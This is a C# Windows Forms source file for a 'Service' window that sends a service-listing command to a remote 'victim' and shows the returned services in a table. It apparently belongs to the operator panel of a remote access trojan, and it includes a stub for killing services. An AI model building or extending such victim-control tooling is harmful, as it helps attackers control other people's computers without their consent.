using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmService : Form
    {
        public clsVictim m_victim { get; init; }

        public frmService(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
        }

        void fnRecv(clsClient clnt, string szVictimID, List<string> lsMsg)
        {
            if (!string.Equals(szVictimID, m_victim.m_szID))
                return;

            if (lsMsg[0] == "serv")
            {
                if (lsMsg[1] == "ls")
                {
                    var ls2d = clsTools.EZData.String2TwoDList(lsMsg[2]);
                    foreach (var ls in ls2d)
                    {
                        ListViewItem item = new ListViewItem(ls[0]);
                        for (int i = 1; i < ls.Count; i++)
                            item.SubItems.Add(ls[i]);

                        Invoke(new Action(() => listView1.Items.Add(item)));
                    }
                }
                else if (lsMsg[1] == "kill")
                {

                }
            }
        }

        void fnInitServ()
        {
            toolStripStatusLabel1.Text = "Loading...";

            m_victim.fnSendCommand(new string[]
            {
                "Service",
                "ls",
            });
        }

        void fnSetup()
        {
            m_victim.m_clnt.ServerMessageReceived += fnRecv;

            listView1.View = View.Details;
            listView1.FullRowSelect = true;
            listView1.Columns.Add("Name", 200);
            listView1.Columns.Add("Load", 80);
            listView1.Columns.Add("Active", 80);
            listView1.Columns.Add("Sub", 80);
            listView1.Columns.Add("Description", 250);

            fnInitServ();
        }

        private void frmService_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmService_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnRecv;
        }
    }
}
